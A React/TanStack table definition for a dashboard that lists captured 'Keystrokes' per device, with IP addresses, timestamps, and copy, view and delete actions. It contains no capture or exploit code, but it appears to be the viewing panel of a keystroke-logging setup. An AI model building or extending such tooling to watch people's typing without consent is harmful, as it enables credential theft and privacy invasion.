"use client";

import type { ColumnDef } from "@tanstack/react-table";
import { ArrowUpDown, Copy, Eye, MoreHorizontal, Trash2 } from "lucide-react";

import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";

export type LogEntry = {
  id: string;
  device: string;
  data: string;
  ip: string;
  timestamp: string;
};

function formatTimestamp(isoString: string): string {
  const date = new Date(isoString);
  return new Intl.DateTimeFormat("en-US", {
    year: "numeric",
    month: "short",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  }).format(date);
}

function truncateData(data: string, maxLength = 80): string {
  if (data.length <= maxLength) return data;
  return `${data.slice(0, maxLength)}...`;
}

const deviceColors: Record<string, "default" | "secondary" | "outline"> = {};
const colorOptions: Array<"default" | "secondary" | "outline"> = [
  "default",
  "secondary",
  "outline",
];
let colorIndex = 0;

function getDeviceColor(device: string): "default" | "secondary" | "outline" {
  if (!deviceColors[device]) {
    deviceColors[device] = colorOptions[colorIndex % colorOptions.length];
    colorIndex++;
  }
  return deviceColors[device];
}

export const columns: ColumnDef<LogEntry>[] = [
  {
    accessorKey: "device",
    header: ({ column }) => {
      return (
        <Button
          variant="ghost"
          onClick={() => column.toggleSorting(column.getIsSorted() === "asc")}
        >
          Device
          <ArrowUpDown className="ml-2 h-4 w-4" />
        </Button>
      );
    },
    cell: ({ row }) => {
      const device = row.getValue("device") as string;
      return (
        <Badge variant={getDeviceColor(device)} className="font-mono">
          {device}
        </Badge>
      );
    },
  },
  {
    accessorKey: "data",
    header: "Keystrokes",
    cell: ({ row }) => {
      const data = row.getValue("data") as string;
      return (
        <div className="max-w-[400px] font-mono text-xs">
          <span className="whitespace-pre-wrap break-all">
            {truncateData(data)}
          </span>
        </div>
      );
    },
  },
  {
    accessorKey: "ip",
    header: ({ column }) => {
      return (
        <Button
          variant="ghost"
          onClick={() => column.toggleSorting(column.getIsSorted() === "asc")}
        >
          IP Address
          <ArrowUpDown className="ml-2 h-4 w-4" />
        </Button>
      );
    },
    cell: ({ row }) => {
      return (
        <span className="font-mono text-muted-foreground text-xs">
          {row.getValue("ip")}
        </span>
      );
    },
  },
  {
    accessorKey: "timestamp",
    header: ({ column }) => {
      return (
        <Button
          variant="ghost"
          onClick={() => column.toggleSorting(column.getIsSorted() === "asc")}
        >
          Timestamp
          <ArrowUpDown className="ml-2 h-4 w-4" />
        </Button>
      );
    },
    cell: ({ row }) => {
      const timestamp = row.getValue("timestamp") as string;
      return (
        <span className="whitespace-nowrap text-muted-foreground text-sm">
          {formatTimestamp(timestamp)}
        </span>
      );
    },
  },
  {
    id: "actions",
    cell: ({ row }) => {
      const log = row.original;

      return (
        <DropdownMenu>
          <DropdownMenuTrigger
            render={<Button variant="ghost" className="h-8 w-8 p-0" />}
          >
            <span className="sr-only">Open menu</span>
            <MoreHorizontal className="h-4 w-4" />
          </DropdownMenuTrigger>
          <DropdownMenuContent align="end">
            <DropdownMenuLabel>Actions</DropdownMenuLabel>
            <DropdownMenuItem
              onClick={() => navigator.clipboard.writeText(log.data)}
            >
              <Copy className="mr-2 h-4 w-4" />
              Copy keystrokes
            </DropdownMenuItem>
            <DropdownMenuItem
              onClick={() => navigator.clipboard.writeText(log.id)}
            >
              <Copy className="mr-2 h-4 w-4" />
              Copy log ID
            </DropdownMenuItem>
            <DropdownMenuSeparator />
            <DropdownMenuItem
              onClick={() => {
                const el = document.getElementById(`log-detail-${log.id}`);
                if (el) {
                  el.classList.toggle("hidden");
                }
              }}
            >
              <Eye className="mr-2 h-4 w-4" />
              View full data
            </DropdownMenuItem>
            <DropdownMenuSeparator />
            <DropdownMenuItem
              variant="destructive"
              onClick={async () => {
                try {
                  const res = await fetch(`/api/logs/${log.id}`, {
                    method: "DELETE",
                    headers: {
                      "x-api-key": localStorage.getItem("apiKey") ?? "",
                    },
                  });
                  if (res.ok) {
                    window.location.reload();
                  }
                } catch (error) {
                  console.error("Failed to delete log:", error);
                }
              }}
            >
              <Trash2 className="mr-2 h-4 w-4" />
              Delete log
            </DropdownMenuItem>
          </DropdownMenuContent>
        </DropdownMenu>
      );
    },
  },
];
